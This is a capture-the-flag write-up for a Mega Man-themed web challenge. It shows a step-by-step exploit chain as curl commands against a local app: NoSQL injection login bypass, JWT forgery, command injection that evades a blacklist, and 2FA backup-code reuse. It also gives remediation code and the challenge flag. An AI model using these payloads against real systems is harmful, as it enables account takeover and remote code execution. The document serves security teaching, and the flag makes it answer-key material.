# RoboBook CTF Challenge - Writeup

## Challenge Overview

**Name:** RoboBook - Robot Master Rebellion  
**Theme:** Mega Man / Retro Gaming  
**Difficulty:** Medium  
**Flag:** `CM{master_override_wily_defeated_20XX_f3a8c5d9}`

### Scenario

Dr. Wily has hacked into RoboBook, a social network for Robot Masters, and taken control of the admin account. The Robot Masters have gone rogue and are threatening the city. Your mission is to infiltrate the platform, gain admin access, and submit the Master Override Code to shut down all rogue robots.

### Learning Focus

This challenge is designed to be beginner-friendly and educational, focusing on common web application vulnerabilities that are frequently encountered in real-world scenarios. The challenge does not include advanced hardening techniques or obscure exploits - instead, it encourages players to understand fundamental security concepts and get creative with chaining multiple vulnerabilities together. It's perfect for those learning web security, practicing for OSCP/OSWE, or wanting to understand how different vulnerabilities can be combined in an attack chain.

---

## Solution Path

This challenge requires chaining multiple vulnerabilities to reach the final flag. There are different paths to success:

**Core Vulnerabilities (Required):**

1. **NoSQL Injection** - Bypass login authentication (can be used multiple times)
2. **JWT Manipulation** - Forge engineer role token
3. **RCE (Remote Code Execution)** - Read files from the server
4. **2FA Bypass** - Use backup codes to gain admin access

**Optional Reconnaissance:**

- **IDOR (Insecure Direct Object Reference)** - Access other users' data for hints (helpful but not required)

---

## Stage 1: NoSQL Injection

### Vulnerability

The login endpoint at `/api/auth/login` is vulnerable to NoSQL injection on the `password` field. While the username is properly validated as a string, the password field accepts MongoDB query operators.

### Exploitation

**Vulnerable Code:**

```javascript
const user = await db.collection("users").findOne({
  username: username,
  password_hash: password,
});
```

**Attack:**
Send a POST request to `/api/auth/login` with a MongoDB operator in the password field:

```bash
curl -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "dr_wily", "password": {"$ne": null}}'
```

This bypasses password verification because `{"$ne": null}` matches any non-null value.

**Response:**

```json
{
  "requires_2fa": true,
  "session_id": "abc123",
  "user_id": 1,
  "message": "2FA required. Use /api/auth/verify-2fa"
}
```

### Key Insight

Dr. Wily has 2FA enabled, so we can't directly access the admin account yet. We need to explore other vulnerabilities first.

**Note:** You can also use NoSQL injection to login as other users (like `mega_man`, `roll_assistant`, etc.) to explore the platform and gather information.

---

## Stage 2: Reconnaissance (Optional)

This stage is **optional** - you can skip directly to Stage 3 if you already know about the diagnostics endpoint and want to explore the server filesystem.

### Option A: IDOR Vulnerability

The `/api/users/:id` and `/api/users/:id/messages` endpoints don't verify authorization, allowing you to access other users' data.

First, register a new account or login as any user to get a valid JWT token:

```bash
curl -X POST http://localhost:4000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "email": "hacker@test.com", "password": "password123"}'
```

Then enumerate user profiles and messages:

```bash
# View Dr. Wily's profile
curl http://localhost:4000/api/users/1 \
  -H "Cookie: token=YOUR_JWT_TOKEN"

# Access Dr. Wily's messages
curl http://localhost:4000/api/users/1/messages \
  -H "Cookie: token=YOUR_JWT_TOKEN"
```

### Option B: Login as Other Users via NoSQL Injection

You can also use NoSQL injection to login as different users and explore their accounts:

```bash
# Login as mega_man
curl -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "mega_man", "password": {"$ne": null}}'

# Login as roll_assistant
curl -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "roll_assistant", "password": {"$ne": null}}'
```

### Key Findings from Reconnaissance

Through either method, you can discover:

1. **Engineer Role Required:** The diagnostics panel at `/diagnostics` requires the "engineer" role
2. **Backup Codes Location:** Dr. Wily stored his 2FA backup codes in `/secrets/wily_backup_codes.txt`
3. **Command Chaining Hint:** Even with engineer access, you'd need to know about "command chaining" to explore the filesystem
4. **Social Media Posts:** Dr. Wily's posts mention the diagnostics tool and backup codes

---

## Stage 3: JWT Manipulation

### Vulnerability

The authentication middleware uses `jwt.decode()` instead of `jwt.verify()`, which doesn't validate the signature:

```javascript
const decoded = jwt.decode(token); // ❌ No signature verification!
req.user = decoded;
```

This allows us to forge JWT tokens with any role we want.

### Exploitation

**Step 1: Decode your existing JWT**

```bash
echo "YOUR_JWT_TOKEN" | base64 -d
```

**Step 2: Create a forged JWT with engineer role**

JWT structure:

```
header.payload.signature
```

Create a new payload with `role: "engineer"`:

```json
{
  "user_id": 10,
  "username": "Angel911",
  "role": "engineer",
  "iat": 1700000000,
  "exp": 1700086400
}
```

**Step 3: Forge the token**

You can use online JWT tools or write a script:

```javascript
const jwt = require("jsonwebtoken");

const payload = {
  user_id: 10,
  username: "Angel911",
  role: "engineer",
};

// The JWT_SECRET is weak: "arcade1" (can be brute-forced)
const token = jwt.sign(payload, "arcade1", { expiresIn: "24h" });
console.log(token);
```

**Alternative: Brute-force the JWT secret**

The JWT secret is intentionally weak (`arcade1`). You can brute-force it using tools like `jwt_tool` or `hashcat`.

### Verification

Test your forged token:

```bash
curl http://localhost:4000/api/diagnostics/ping \
  -H "Cookie: token=YOUR_FORGED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target": "8.8.8.8"}'
```

If successful, you now have engineer access!

---

## Stage 4: RCE (Remote Code Execution)

### Vulnerability

The diagnostics endpoint executes shell commands with user input:

```javascript
exec(`ping -c 2 ${target}`, ...)
```

While there's a blacklist of dangerous commands, semicolon (`;`) is allowed for command chaining.

### Exploitation

**Blocked commands:**

- `cat`, `grep`, `find`, `wget`, `curl`, `bash`, `sh`, etc.

**Allowed commands:**

- `ping`, `ls`, `base64`, `tac`, `diff`, `rev`

**Step 1: List the secrets directory**

```bash
curl -X POST http://localhost:4000/api/diagnostics/ping \
  -H "Cookie: token=YOUR_ENGINEER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target": "8.8.8.8; ls secrets"}'
```

**Response:**

```
README.txt
wily_backup_codes.txt
```

**Step 2: Read the backup codes file**

Since `cat` is blocked, use alternative commands:

```bash
# Using tac (reverse cat)
curl -X POST http://localhost:4000/api/diagnostics/ping \
  -H "Cookie: token=YOUR_ENGINEER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target": "8.8.8.8; tac secrets/wily_backup_codes.txt"}'
```

Or:

```bash
# Using base64
curl -X POST http://localhost:4000/api/diagnostics/ping \
  -H "Cookie: token=YOUR_ENGINEER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target": "8.8.8.8; base64 secrets/wily_backup_codes.txt"}'
```

### Key Findings

The file reveals:

1. **2FA Backup Codes:**

   - `MEGA-2024-WILY`
   - `ROBOT-MASTER-99`
   - `EVIL-GENIUS-42`

2. **Flag Fragment 1:**
   ```
   CM{master_override_
   ```

---

## Stage 5: 2FA Bypass with Backup Codes

### Vulnerability

The 2FA verification endpoint accepts backup codes, and these codes are **reusable** (not invalidated after use).

### Exploitation

**Step 1: Login as Dr. Wily using NoSQL injection**

```bash
curl -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "dr_wily", "password": {"$ne": null}}'
```

**Response:**

```json
{
  "requires_2fa": true,
  "user_id": 1,
  "session_id": "xyz789"
}
```

**Step 2: Bypass 2FA using backup code**

```bash
curl -X POST http://localhost:4000/api/auth/verify-2fa \
  -H "Content-Type: application/json" \
  -d '{"user_id": 1, "backup_code": "MEGA-2024-WILY"}'
```

**Response:**

```json
{
  "success": true,
  "token": "ADMIN_JWT_TOKEN",
  "role": "admin",
  "flag_fragment_2": "wily_defeated_20XX_f3a8c5d9}",
  "hint": "Navigate to /admin.html to complete your mission!"
}
```

### Flag Fragment 2

```
wily_defeated_20XX_f3a8c5d9}
```

---

## Final Stage: Master Override

### Complete Flag Assembly

Combine both fragments:

```
Fragment 1: CM{master_override_
Fragment 2: wily_defeated_20XX_f3a8c5d9}

Complete Flag: CM{master_override_wily_defeated_20XX_f3a8c5d9}
```

### Submit the Override Code

Navigate to `/admin.html` (now accessible with admin role) and submit the complete flag:

```bash
curl -X POST http://localhost:4000/api/admin/override \
  -H "Cookie: token=ADMIN_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"override_code": "CM{master_override_wily_defeated_20XX_f3a8c5d9}"}'
```

**Success Response:**

```json
{
  "success": true,
  "message": "🎉 MASTER OVERRIDE ACCEPTED! All Robot Masters have been shut down.",
  "flag": "CM{master_override_wily_defeated_20XX_f3a8c5d9}",
  "congratulations": "You saved the city! Dr. Light thanks you, hero of 20XX!",
  "stats": {
    "stages_completed": 5,
    "fragments_collected": 2,
    "exploit_chain": [
      "NoSQL Injection",
      "JWT Manipulation",
      "RCE",
      "2FA Bypass"
    ]
  }
}
```

---

## Vulnerability Summary

### 1. NoSQL Injection

**Location:** `/api/auth/login`  
**Impact:** Authentication bypass  
**Fix:** Validate that password is a string before querying:

```javascript
if (typeof password !== "string") {
  return res.status(400).json({ error: "Invalid password format" });
}
```

### 2. IDOR

**Location:** `/api/users/:id`, `/api/users/:id/messages`  
**Impact:** Unauthorized access to user data  
**Fix:** Verify authorization:

```javascript
if (req.user.user_id !== userId && req.user.role !== "admin") {
  return res.status(403).json({ error: "Unauthorized" });
}
```

### 3. JWT Signature Not Verified

**Location:** `authenticateToken` middleware  
**Impact:** Token forgery  
**Fix:** Use `jwt.verify()` instead of `jwt.decode()`:

```javascript
const decoded = jwt.verify(token, JWT_SECRET);
```

### 4. Command Injection

**Location:** `/api/diagnostics/ping`  
**Impact:** Remote code execution  
**Fix:** Use parameterized commands or proper input validation:

```javascript
const { spawn } = require("child_process");
const ping = spawn("ping", ["-c", "2", target]);
```

### 5. Reusable 2FA Backup Codes

**Location:** `/api/auth/verify-2fa`  
**Impact:** 2FA bypass  
**Fix:** Invalidate backup codes after use:

```javascript
await db
  .collection("users")
  .updateOne({ _id: user._id }, { $pull: { backup_codes: backup_code } });
```

---

## Tools Used

- **curl** - HTTP requests
- **Burp Suite** - Request interception and modification
- **jwt.io** - JWT decoding and encoding
- **jwt_tool** - JWT manipulation and brute-forcing
- **base64** - Encoding/decoding

---

## Alternative Solution Paths

### Path 1: Full Reconnaissance

NoSQL Injection → IDOR → JWT Manipulation → RCE → 2FA Bypass → Admin Access

### Path 2: Direct Approach

NoSQL Injection (as other users) → JWT Manipulation → RCE → 2FA Bypass → Admin Access

### Path 3: Minimal Steps

Register Account → JWT Manipulation → RCE → NoSQL Injection (as dr_wily) → 2FA Bypass → Admin Access

All paths lead to the same goal, demonstrating that there are multiple ways to approach web application security challenges.

---

## Learning Outcomes

This challenge demonstrates:

1. **Defense in Depth:** Multiple vulnerabilities must be chained together
2. **Input Validation:** Always validate and sanitize user input
3. **Authentication Security:** Proper JWT verification and 2FA implementation
4. **Authorization Checks:** Verify user permissions for every action
5. **Command Injection Prevention:** Never execute user input directly
6. **Creative Problem Solving:** Finding alternative commands when common tools are blocked

---

## Credits

Challenge created for CTF competition  
Theme: Mega Man / Robot Masters  
Difficulty: Medium  
Estimated solve time: 2-4 hours

🎮 **Game Over - You Win!** 🎮
